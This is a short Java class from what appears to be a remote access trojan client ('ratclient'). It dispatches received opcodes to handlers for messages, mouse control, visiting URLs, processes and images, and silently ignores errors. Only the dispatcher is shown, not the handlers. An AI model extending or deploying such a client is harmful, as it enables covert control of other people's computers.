package ej.ratclient.packet;

import ej.ratclient.packet.impl.*;

public class PacketHandler {

    private static PacketType[] packetTypes = new PacketType[9];

    static {
        packetTypes[0] = packetTypes[1] = new PacketBlank();
        packetTypes[2] = new PacketMessage();
        packetTypes[3] = new PacketMouse();
        packetTypes[4] = new PacketDisconnect();
        packetTypes[5] = new PacketVisitURL();
        packetTypes[6] = new PacketProcess();
        packetTypes[7] = new PacketImage();
    }

    public static void handlePacket(Packet packet) {
        int opcode = packet.get();
        try {
            PacketType getPacket = packetTypes[opcode];
            if (getPacket != null) {
                getPacket.handlePacket(packet);
            }
        } catch (Exception ignored) {
        }
    }
}
